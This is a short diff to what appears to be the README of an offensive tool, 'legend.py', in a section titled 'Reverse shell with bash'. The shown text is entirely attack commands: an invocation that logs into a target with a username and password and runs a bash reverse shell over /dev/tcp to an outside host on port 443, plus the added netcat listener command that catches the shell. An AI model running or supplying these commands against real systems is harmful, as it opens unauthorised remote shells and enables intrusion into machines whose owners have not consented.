@@ -19,3 +19,8 @@ Reverse shell with bash
 ```sh
 ./legend.py -r 1.1.1.1 -p 22 -u user -P pass -c "/bin/bash -pi >& /dev/tcp/2.2.2.2/443 0>&1"
 ```
+
+Listening on $your_port
+```
+sudo nc -nlvp 443
+```
